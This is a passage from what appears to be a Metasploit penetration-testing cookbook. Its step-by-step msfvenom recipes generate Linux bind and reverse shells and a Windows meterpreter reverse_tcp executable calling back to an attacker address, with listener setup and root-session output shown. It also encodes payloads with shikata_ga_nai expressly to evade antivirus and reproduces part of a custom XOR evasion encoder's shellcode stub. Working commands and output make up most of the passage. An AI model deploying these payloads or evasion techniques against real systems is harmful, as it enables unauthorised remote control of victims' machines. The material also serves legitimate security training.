
6. One useful feature when doing exploit development, is the --smallest option, which we can use to generate the smallest possible payload:

```
root@kali:~# msfvenom -p linux/x64/shell_bind_tcp -f elf --smallest -o small.elf
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 86 bytes
Final size of elf file: 206 bytes
Saved as: small.elf
root@kali:~#
```

7. To test this payload, we can set the execution permission using the chmod command, and then run the payload:

```
root@kali:~# chmod +x small.elf
root@kali:~# ./small.elf
```

8. In another terminal, we can use netcat to connect to the bind shell on port 4444:

```
root@kali:~# nc 127.0.0.1 4444
hostname
kali
id
uid=0(root) gid=0(root) groups=0(root)
```

Great, we have a small Linux payload that we can use

9. Now that we have learned how to create a basic bind shell, we will try to create a reverse shell. First, we need to see the available options for the selected payload, which we can do using the --payload-options option:

![](img/6b6e557533100c0e47951d0e5e14c4ee_601_0.png)

10. The options available are overwhelming, but, for the time being, we just need to set up the basic options, such as the listen address and port:

```
root@kali:~# msfvenom -p linux/x64/shell/reverse_tcp LHOST=192.168.216.5 LPORT=1234 -f elf -o reverse.elf
No platform was selected, choosing Msf::Module::Platform::Linux from the payload
No Arch selected, selecting Arch: x64 from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 127 bytes
Final size of elf file: 247 bytes
Saved as: reverse.elf
root@kali:~#
```

11. To test our payload, we first need to set up our listener on port 1234 in Metasploit, using the Generic Payload Handler exploit module:

```
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD linux/x64/shell/reverse_tcp
PAYLOAD => linux/x64/shell/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > set LPORT 1234
LPORT => 1234
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.216.5:1234
```

12. Next, set the execution permission using the chmod command, and then run the payload:

```
root@kali:~# chmod +x reverse.elf
root@kali:~# ./reverse.elf
```

13. As expected, we have a new session:

```
[*] Sending stage (38 bytes) to 192.168.216.5
[*] Command shell session 1 opened
(192.168.216.5:1234 -> 192.168.216.5:52172) at 2017-12-10 07:00:02 -0500

hostname
kali
id
uid=0(root) gid=0(root) groups=0(root)
```

14. Creating payloads for a Windows target is as easy; all we need to do is specify the architecture to use, the target platform, the payload we need to run on the target, the listen followed by the output format and name:

```
root@kali:~# msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -o payload.exe
No encoder or badchars specified, outputting raw payload
Payload size: 333 bytes
Final size of exe file: 73802 bytes
Saved as: payload.exe
```

15. Next, we need to set up the listener in Metasploit, using the Generic Payload Handler exploit module:

```
root@kali:~# msfconsole -q
msf > use exploit/multi/handler
msf exploit(handler) > set PAYLOAD windows/meterpreter/reverse_tcp
PAYLOAD => windows/meterpreter/reverse_tcp
msf exploit(handler) > set LHOST 192.168.216.5
LHOST => 192.168.216.5
msf exploit(handler) > run
```

```
[*] Started reverse TCP handler on 192.168.216.5:4444
```

16. Now that we have the listener ready, we simply need to download the payload to the Windows target machine and run it, which should return a new session:

```
msf exploit(handler) > run

[*] Started reverse TCP handler on 192.168.216.5:4444
[*] Sending stage (179779 bytes) to 192.168.216.10
[*] Meterpreter session 1 opened
(192.168.216.5:4444 -> 192.168.216.10:49675) at 2017-12-11 15:46:11 +0000

meterpreter >
```

Specifying an additional win32 shellcode, by using the -c or --add-code option, we can turn multiple payloads into one.

17. First, we will create a simple payload that will pop up a message on the target, using the windows/messagebox payload:

```
root@kali:~# msfvenom -a x86 --platform windows -p windows/messagebox TEXT="First Payload" -f raw > First_Payload
No encoder or badchars specified, outputting raw payload
Payload size: 267 bytes
root@kali:~#
```

18. Then, we will use the -c option to add our first payload to the second:

```
root@kali:~# msfvenom -c First_Payload -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -o multi.exe
Adding shellcode from First_Payload to the payload
No encoder or badchars specified, outputting raw payload
Payload size: 917 bytes
Final size of exe file: 73802 bytes
Saved as: multi.exe
root@kali:~#
```

19. When we execute the payload, we get a message box on the target machine and a new session on our listener:

![](img/6b6e557533100c0e47951d0e5e14c4ee_604_0.png)

## Encoders

Generating payloads is just the first step; nowadays security products, such as Intrusion Detection Systems (IDSs), antivirus and anti-malware software, can easily pick up the shellcode generated by MSFvenom. To help us evade security, we can use encoders to encode our shellcode.

### How to do it...

- 1. By using MSFconsole with the show encoders option, or by browsing to the /usr/share/metasploit-framework/modules/encoders/ folder in our Kali Linux machine, we can see all the encoders available on the Metasploit Framework:

```
msf > show encoders
```

- 2. To encode one of our previous payloads, we simply add the -e option, followed by the encoder we want to use, and, if we so choose, we can use the -i option, followed by the number of times to encode the payload:

```
msf > msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe
[*] exec: msfvenom -a x86 --platform windows -p windows/meterpreter/reverse_tcp LHOST=192.168.216.5 -f exe -e x86/shikata_ga_nai -i 10 -o encoded.exe

Found 1 compatible encoders
Attempting to encode payload with 10 iterations of x86/shikata_ga_nai
x86/shikata_ga_nai succeeded with size 360 (iteration=0)
x86/shikata_ga_nai succeeded with size 387 (iteration=1)
x86/shikata_ga_nai succeeded with size 414 (iteration=2)
x86/shikata_ga_nai succeeded with size 441 (iteration=3)
x86/shikata_ga_nai succeeded with size 468 (iteration=4)
x86/shikata_ga_nai succeeded with size 495 (iteration=5)
x86/shikata_ga_nai succeeded with size 522 (iteration=6)
x86/shikata_ga_nai succeeded with size 549 (iteration=7)
x86/shikata_ga_nai succeeded with size 576 (iteration=8)
x86/shikata_ga_nai succeeded with size 603 (iteration=9)
x86/shikata_ga_nai chosen with final size 603
Payload size: 603 bytes
Final size of exe file: 73802 bytes
Saved as: encoded.exe
msf >
```

- 3. To verify whether your payload is going to be detected by the antivirus, we can use VirusTotal:

![](img/6b6e557533100c0e47951d0e5e14c4ee_606_0.png)

Unfortunately, as I expected, most antiviruses will detect our payload even though we encoded it 10 times. With time, security companies started detecting the default encoders in Metasploit. But all is not lost; if we use custom encoders, we can still leverage Metasploit to bypass security products.

- 4. In this recipe, we will use a custom encoder created by François Profizi, which uses a brute force attack on a known plaintext to bypass security products:

```
##
# This module requires Metasploit:
http://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require 'msf/core'

class MetasploitModule < Msf::Encoder

def initialize
super(
'Name' => 'bf_xor',
'Description' => '',
'Author' => 'François Profizi',
'Arch' => ARCH_X86,
'License' => MSF_LICENSE
)
end

def decoder_stub(state)
stub = ""
stub << "\xEB\x62\x55\x8B\xEC\x83\xEC\x18\x8B\x7D\x10\x8B\x75\x0C\x33\xC0\x89\x45\xFC\x8B"
stub << "\xC8\x83\xB1\x03\x03\xC9\x03\xC9\x03\xC9\x8B\xDA\xD3\xFB\x8A\xCB\x33\xDB\x39\x5D"
stub << "\x14\x75\x18\x0F\xB6\x1E\x0F\xB6\xC9\x33\xD9\x8B\x4D\x08\x0F\xB6\x0C\x08\x3B\xD9"
stub << "\x75\x07\xFF\x45\xFC\xEB\x02\x30\x0E\x40\x46\x3B\xC7\x7C\xC8\x3B\x7D\xFC\x74\x10"
stub << "\x83\x7D\x14\x01\x74\x06\x42\x83\xFA\xFF\x72\xAF\x33\xC0\xEB\x02\x8B\xC2\xC9\xC3"
stub << "\x55\x8B\xEC\x83\xEC\x10\xEB\x50\x58\x89\x45\xFC\xE7\x58\x8B\x10\x89\x55\xF8"
stub << "\x83\xC0\x04\x89\x45\xF4\x33\xDB\x33\xC0\x50\x6A\x0A\xFF\x75\xFC\xFF\x75\xF4\xE8"
stub << "\x72\xFF\xFF\xFF\x85\xC0\x74\x13\x6A\x01\xFF\x75\xF8\xFF\x75\xFC\xFF\x75\xF4\xE8"
stub << "\x5E\xFF\xFF\xFF\xFF\x65\xFC\xC9\xC3\xE8\xC4\xFF\xFF\xFF"
stub << [state.buf.length].pack("L") # size payload
stub << state.buf[0,10]
```
